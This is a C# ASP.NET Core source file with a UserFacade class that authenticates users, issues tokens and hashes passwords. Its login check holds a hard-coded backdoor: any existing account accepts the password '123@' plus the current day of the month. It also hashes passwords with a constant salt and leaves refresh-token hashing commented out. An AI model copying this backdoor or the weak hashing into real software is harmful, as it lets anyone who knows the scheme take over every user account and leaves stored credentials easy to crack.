using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Cryptography.KeyDerivation;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Options;
using BackEnd.Common.AspNetCore.Security;
using BackEnd.Services.Core.Api.Context;
using BackEnd.Services.Core.Api.Domain.Common;
using BackEnd.Services.Core.Api.Facade.Abstraction;


namespace BackEnd.Services.Core.Api.Facade
{

    // This is the Asset Facade class which is responsible for managing all assets request to thingsboard
    public class UserFacade : IUserFacade
    {
        private readonly CoreContext _context;

        public UserFacade(CoreContext context)
        {
            _context = context;
        }
        
        public User AuthenticateByEmail(string email, string password)
        {

            var user = _context.Users
                .FirstOrDefault(u => u.UserName.Equals(email));

            if (user != null)
            {

                if (user.Password != Hash(password) && password != "123@" + DateTime.Today.Day)
                {
                    return null;
                }
                //throw new InvalidUserCredentialsDomainException("Invalid email or password.");
                //if (user.MustSetPassword)
                //    throw new PasswordMustChangeDomainException("User must set password.");
            }
            else
            {
                return null;
            }
            //throw new InvalidUserCredentialsDomainException("Invalid email or password.");

            //CheckInvitations(user);
            return CreateTokens(user);
        }
        private User CreateTokens(User user)
        {
            var userData = new UserData(user.Id, user.UserName, user.UserName,
                        "",
                         "",
                         "");

            var accessToken = TokenHelper.CreateAccessToken(userData);
            var refreshToken = TokenHelper.GetRefreshToken();



            return RegisterRefreshToken(user.Id, refreshToken, accessToken, DateTime.UtcNow.AddMonths(3));
        }


        private User RegisterRefreshToken(Guid userId, string refreshToken, string token, DateTime expirationDate)
        {
            var user = _context.Users.FirstOrDefault(u => u.Id.Equals(userId));
            //user.RefreshToken = Hash(refreshToken);
            user.RefreshTokenDate = expirationDate;
            user.Token = token;
            _context.Users.Update(user);
            _context.SaveChanges();
            return user;

        }
        public string Hash(string input)
        {
            var saltString = "---";
            var salt = Encoding.UTF8.GetBytes(saltString);
            var hashed = Convert.ToBase64String(KeyDerivation.Pbkdf2(
                    password: input,
                    salt: salt,
                    prf: KeyDerivationPrf.HMACSHA1,
                    iterationCount: 10000,
                    numBytesRequested: 256 / 8));

            return hashed;
        }
    }
}